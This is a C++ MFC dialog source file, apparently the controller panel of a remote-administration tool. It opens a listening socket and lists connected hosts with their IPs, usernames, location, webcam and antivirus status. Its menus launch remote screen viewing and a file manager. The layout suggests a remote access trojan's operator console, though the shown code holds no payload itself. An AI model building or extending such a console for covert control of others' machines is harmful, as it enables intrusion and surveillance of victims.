// nbtaxDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "nbtax.h"
#include "nbtaxDlg.h"
#include "afxdialogex.h"
#include "pzwj.h"
#include "pzkl.h"	
#include <winsock2.h>  // 包含Winsock库头文件
#pragma comment(lib, "ws2_32.lib")
#include "socket.h"
#include "getip.h"
#include "screen.h"
#include "CTreeListDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();


	// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	// 实现
protected:
	DECLARE_MESSAGE_MAP()
public:


};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
    ON_WM_RBUTTONDOWN()
  
END_MESSAGE_MAP()


// CnbtaxDlg 对话框



CnbtaxDlg::CnbtaxDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_NBTAX_DIALOG, pParent),m_listenSocket(INVALID_SOCKET)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CnbtaxDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CnbtaxDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()


	ON_BN_CLICKED(IDC_BUTTON1, &CnbtaxDlg::OnClickedButton1)

//	ON_BN_CLICKED(IDC_MFCMENUBUTTON1, &CnbtaxDlg::OnClickedMfcmenubutton1)
//	ON_BN_CLICKED(IDC_BUTTON4, &CnbtaxDlg::OnClickedButton4)

ON_BN_CLICKED(IDC_MFCMENUBUTTON1, &CnbtaxDlg::OnBnClickedMfcmenubutton1)
ON_WM_MOUSEMOVE()
ON_WM_RBUTTONDOWN()
ON_NOTIFY(NM_RCLICK, ID_WIZNEXT, &CnbtaxDlg::OnNMRClickWiznext)
ON_COMMAND(ID_TEST_32807, &CnbtaxDlg::screen)
ON_COMMAND(ID_TEST_32806, &CnbtaxDlg::filemanger)
END_MESSAGE_MAP()



void CnbtaxDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CnbtaxDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CnbtaxDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CnbtaxDlg::OnClickedButton1()
{
	pzwj dlg; 
	
	dlg.DoModal();


	// TODO: 在此添加控件通知处理程序代码
}
BOOL CnbtaxDlg::OnInitDialog()
{
   
    CDialogEx::OnInitDialog();

    if (!InitializeWinsockAndSocket())
    {
        AfxMessageBox(_T("Winsock 初始化或套接字创建失败！111111111111"));
        return FALSE;
    }
// 假设 m_listenSocket 是 CnbtaxDlg 类中存储监听套接字的成员变量

   /// // 后续绑定、监听等操作可继续在此函数中编写，或者进一步模块化到 socket.cpp 中



    CListCtrl* pListCtrlWiznext = (CListCtrl*)GetDlgItem(ID_WIZNEXT);
    if (pListCtrlWiznext) {
        pListCtrlWiznext->SetExtendedStyle(pListCtrlWiznext->GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        pListCtrlWiznext->InsertColumn(0, _T("外网-IP"), LVCFMT_LEFT, 165);
        pListCtrlWiznext->InsertColumn(1, _T("内网-IP"), LVCFMT_LEFT, 160);
        pListCtrlWiznext->InsertColumn(2, _T("系统"), LVCFMT_LEFT, 160);
        pListCtrlWiznext->InsertColumn(3, _T("主机名"), LVCFMT_LEFT, 180);
        pListCtrlWiznext->InsertColumn(4, _T("用户名"), LVCFMT_LEFT, 180);
        pListCtrlWiznext->InsertColumn(5, _T("地理位置"), LVCFMT_LEFT, 180);
        pListCtrlWiznext->InsertColumn(6, _T("CPU"), LVCFMT_LEFT, 180);
        pListCtrlWiznext->InsertColumn(7, _T("内存"), LVCFMT_LEFT, 180);
   
        pListCtrlWiznext->InsertColumn(9, _T("视频"), LVCFMT_LEFT, 180);
        pListCtrlWiznext->InsertColumn(10, _T("延迟"), LVCFMT_LEFT, 180);
        pListCtrlWiznext->InsertColumn(11, _T("备注"), LVCFMT_LEFT, 100);
        pListCtrlWiznext->InsertColumn(12, _T("安装日期"), LVCFMT_LEFT, 180);
        pListCtrlWiznext->InsertColumn(13, _T("杀毒"), LVCFMT_LEFT, 180);
    }

    CListCtrl* pListCtrlList1 = (CListCtrl*)GetDlgItem(IDC_LIST1);
    if (pListCtrlList1) {
        pListCtrlList1->SetExtendedStyle(pListCtrlList1->GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        pListCtrlList1->InsertColumn(0, _T("时间"), LVCFMT_LEFT, 180);
        pListCtrlList1->InsertColumn(1, _T("类型"), LVCFMT_LEFT, 180);
        pListCtrlList1->InsertColumn(2, _T("事件"), LVCFMT_LEFT, 260);
    }

    // 将“关于...”菜单项添加到系统菜单中。
    // IDM_ABOUTBOX 必须在系统命令范围内。
    ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
    ASSERT(IDM_ABOUTBOX < 0xF000);

    CMenu* pSysMenu = GetSystemMenu(FALSE);
    if (pSysMenu != nullptr)
    {
        BOOL bNameValid;
        CString strAboutMenu;
        bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
        ASSERT(bNameValid);
        if (!strAboutMenu.IsEmpty())
        {
            pSysMenu->AppendMenu(MF_SEPARATOR);
            pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
        }
    }

    // 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
    //  执行此操作
    SetIcon(m_hIcon, TRUE);         // 设置大图标
    SetIcon(m_hIcon, FALSE);        // 设置小图标


	
    // 启动一个线程来处理客户端连接
    StartClientConnectionThread(this);

    return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}
   





    void CnbtaxDlg::OnBnClickedMfcmenubutton1()
    {
        CMenu menu;
        // 加载菜单资源，IDR_MENU1是菜单资源ID
        if (!menu.LoadMenu(IDR_MENU1))
        {
            // 加载失败处理，记录日志并弹出提示框
            AfxMessageBox(_T("菜单资源加载失败"));
            // 可以在这里添加更详细的日志记录，例如使用 AfxTrace 输出错误信息
            return;
        }

        CMenu* pPopup = menu.GetSubMenu(0);
        if (pPopup != NULL)
        {
            CPoint point;
            // 获取鼠标当前位置
            if (!GetCursorPos(&point))
            {
                AfxMessageBox(_T("获取鼠标位置失败"));
                menu.DestroyMenu();
                return;
            }

            // 在鼠标位置显示弹出菜单
            int result = pPopup->TrackPopupMenu(TPM_RIGHTBUTTON, point.x, point.y, this);
            if (result == 0)
            {
                AfxMessageBox(_T("弹出菜单失败"));
            }
        }
        else
        {
            AfxMessageBox(_T("获取子菜单失败"));
        }

        // 销毁菜单对象
        menu.DestroyMenu();
    }

    void CnbtaxDlg::OnNMRClickWiznext(NMHDR* pNMHDR, LRESULT* pResult)
    {
        NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;

        // 检查是否点击在有效的列表项上
        if (pNMListView->iItem != -1)
        {
            CMenu menu;

            // 尝试加载菜单
            if (!menu.LoadMenu(IDR_MENU2))
            {
                // 加载菜单失败，记录错误日志
                TRACE(_T("Failed to load menu with IDR_MENU2.\n"));
                *pResult = -1;
                return;
            }

            CMenu* pSubMenu = menu.GetSubMenu(0);
            if (pSubMenu)
            {
                CPoint point;
                if (!GetCursorPos(&point))
                {
                    // 获取光标位置失败，记录错误日志
                    TRACE(_T("Failed to get cursor position.\n"));
                    *pResult = -1;
                    return;
                }

                // 显示弹出菜单
                if (!pSubMenu->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, point.x, point.y, AfxGetMainWnd()))
                {
                    // 显示弹出菜单失败，记录错误日志
                    TRACE(_T("Failed to track popup menu.\n"));
                    *pResult = -1;
                    return;
                }
            }
            else
            {
                // 获取子菜单失败，记录错误日志
                TRACE(_T("Failed to get submenu.\n"));
                *pResult = -1;
                return;
            }

            *pResult = 0;
        }
        else
        {
            // 点击无效列表项，记录日志
            TRACE(_T("Clicked on an invalid list item.\n"));
            *pResult = -1;
        }
    }

    SOCKET CnbtaxDlg::GetListenSocket()
    {
        return m_listenSocket;
    }
    void CnbtaxDlg::screen() {
        HandleClient();
 
    }
    void CnbtaxDlg::filemanger()
    {
        // 1. 创建 CTreeListDlg 实例
        CTreeListDlg dlg;

        // 2. 初始化并启动服务器
        dlg.InitializeWinsock();  // 这会自动启动服务器

        // 3. 显示对话框（模态方式）
        dlg.DoModal();

        // 注意：当DoModal返回时，对话框已关闭，但服务器可能仍在运行
        // 如果需要，可以在这里添加清理代码
    }